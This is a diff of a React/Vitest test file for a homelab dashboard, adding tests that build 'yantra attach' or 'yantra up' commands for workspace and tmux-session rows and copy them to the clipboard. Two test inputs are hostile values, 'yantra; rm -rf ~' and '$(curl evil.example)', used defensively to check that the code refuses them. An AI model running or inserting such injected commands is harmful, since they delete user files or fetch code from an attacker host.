@@ -1,7 +1,22 @@
 import { afterEach, describe, expect, it, vi } from 'vitest'
-import { cleanup, render, renderHook, screen, waitFor } from '@testing-library/react'
+import {
+  cleanup,
+  fireEvent,
+  render,
+  renderHook,
+  screen,
+  waitFor,
+} from '@testing-library/react'
 import type { Looked, Machine, MachineSessions, Session, Workspace } from './api'
-import { machineColumns, sessionColumns, workspaceColumns } from './columns'
+import {
+  machineColumns,
+  sessionColumns,
+  sessionCommand,
+  type SessionRow,
+  workspaceColumns,
+  workspaceCommand,
+} from './columns'
+import { Command } from './components/Command'
 import { DataTable } from './components/DataTable'
 import { Section } from './components/Section'
 import { useLooked } from './useLooked'
@@ -108,20 +123,20 @@ describe('the workspaces table', () => {
     }
     const { container } = render(
       <DataTable
-        columns={workspaceColumns}
+        columns={workspaceColumns({ looked: 'never' })}
         rows={[workspace]}
         rowKey={(row) => row.name}
         empty="no workspaces yet"
       />,
     )
     const cells = [...container.querySelectorAll('td')].map((cell) => cell.textContent)
-    expect(cells.at(-1)).toBe('')
+    expect(cells[3]).toBe('')
   })
 
   it('names the path a file goes in when the look succeeded and found nothing', () => {
     render(
       <DataTable
-        columns={workspaceColumns}
+        columns={workspaceColumns({ looked: 'never' })}
         rows={[]}
         rowKey={(row) => row.name}
         empty="no workspaces yet — make one at ~/.config/yantra/workspaces/<name>.toml"
@@ -164,7 +179,7 @@ describe('the sessions section', () => {
   it('renders attached as the client count rather than a yes or no', () => {
     const { container } = render(
       <DataTable
-        columns={sessionColumns}
+        columns={sessionColumns({ looked: 'never' })}
         rows={[{ machine: 'cachyos-g14', session }]}
         rowKey={(row) => row.machine}
         empty="no tmux sessions"
@@ -177,6 +192,7 @@ describe('the sessions section', () => {
       '2',
       '0',
       'Thu Jul 30 13:02:31 2026',
+      '',
     ])
   })
 })
@@ -249,5 +265,119 @@ describe('the age reading', () => {
     )
     expect(screen.queryByText(/looked \d+s ago/)).toBeNull()
     expect(screen.queryByText('refresh stuck')).toBeNull()
+  })
+})
+
+describe('the command a row carries', () => {
+  function ok<T>(data: T): Looked<T> {
+    return { looked: 'ok', age_seconds: 2, data }
+  }
+
+  const yantra: Workspace = {
+    name: 'yantra',
+    machine: 'cachyos-g14',
+    repo: '/home/<user>/Github/homelab/yantra',
+    startup: null,
+  }
+  const session: Session = {
+    name: 'yantra',
+    windows: 1,
+    attached: 0,
+    created: 'Thu Jul 30 13:02:31 2026',
+  }
+  const row: SessionRow = { machine: 'cachyos-g14', session }
+  const running = ok<MachineSessions[]>([
+    { machine: 'cachyos-g14', reached: 'yes', sessions: [session] },
+  ])
+
+  it('offers attach only when the session was really seen', () => {
+    expect(workspaceCommand(yantra, running)).toBe('yantra attach yantra')
+
+    const idle = ok<MachineSessions[]>([
+      { machine: 'cachyos-g14', reached: 'yes', sessions: [] },
+    ])
+    expect(workspaceCommand(yantra, idle)).toBe('yantra up yantra')
+  })
+
+  it('offers up when the sessions are unknown, since not knowing is not knowing', () => {
+    const failed: Looked<MachineSessions[]> = {
+      looked: 'failed',
+      age_seconds: 1,
+      error: 'tailscaled is down',
+    }
+    expect(workspaceCommand(yantra, failed)).toBe('yantra up yantra')
+    expect(workspaceCommand(yantra, { looked: 'never' })).toBe('yantra up yantra')
+  })
+
+  it('does not read an unreachable machine as a machine with no session', () => {
+    const unreachable = ok<MachineSessions[]>([
+      { machine: 'cachyos-g14', reached: 'no', error: 'connection timed out' },
+    ])
+    expect(workspaceCommand(yantra, unreachable)).toBe('yantra up yantra')
+  })
+
+  it('refuses a name the daemon would not have allowed rather than quoting it', () => {
+    expect(workspaceCommand({ ...yantra, name: 'yantra; rm -rf ~' }, running)).toBeNull()
+    expect(workspaceCommand({ ...yantra, name: '../escape' }, running)).toBeNull()
+    expect(workspaceCommand({ ...yantra, name: '' }, running)).toBeNull()
+  })
+
+  it('builds a session row command from the workspace name, never from tmux', () => {
+    expect(sessionCommand(row, ok([yantra]))).toBe('yantra attach yantra')
+
+    const hostile: SessionRow = {
+      machine: 'cachyos-g14',
+      session: { ...session, name: '$(curl evil.example)' },
+    }
+    expect(sessionCommand(hostile, ok([yantra]))).toBeNull()
+  })
+
+  it('does not match a workspace of the same name on another machine', () => {
+    const elsewhere: SessionRow = { ...row, machine: 'bishwajeets-macbook-pro' }
+    expect(sessionCommand(elsewhere, ok([yantra]))).toBeNull()
+    expect(sessionCommand(row, { looked: 'never' })).toBeNull()
+  })
+
+  it('puts the command in the row, and leaves the machines table without one', () => {
+    render(
+      <DataTable
+        columns={workspaceColumns(running)}
+        rows={[yantra]}
+        rowKey={(one) => one.name}
+        empty="no workspaces yet"
+      />,
+    )
+    expect(screen.getByText('yantra attach yantra')).toBeTruthy()
+    expect(machineColumns.some((column) => column.header === 'COMMAND')).toBe(false)
+  })
+})
+
+describe('copying a command', () => {
+  afterEach(() => {
+    Reflect.deleteProperty(navigator, 'clipboard')
+  })
+
+  it('selects the command and says so on the origin the daemon actually serves', async () => {
+    // jsdom offers neither navigator.clipboard nor execCommand, which is what a
+    // plain-HTTP 100.64.0.0/10 address looks like: not a secure context.
+    render(<Command command="yantra up yantra" />)
+    fireEvent.click(screen.getByRole('button'))
+
+    expect(await screen.findByText('selected — copy it yourself')).toBeTruthy()
+    expect(window.getSelection()?.toString()).toBe('yantra up yantra')
+  })
+
+  it('writes the command itself when a secure context grants a clipboard', async () => {
+    const writeText = vi.fn(() => Promise.resolve())
+    Object.defineProperty(navigator, 'clipboard', {
+      value: { writeText },
+      configurable: true,
+    })
+
+    render(<Command command="yantra attach yantra" />)
+    fireEvent.click(screen.getByRole('button'))
+
+    expect(await screen.findByText('copied')).toBeTruthy()
+    expect(writeText).toHaveBeenCalledWith('yantra attach yantra')
   })
 })
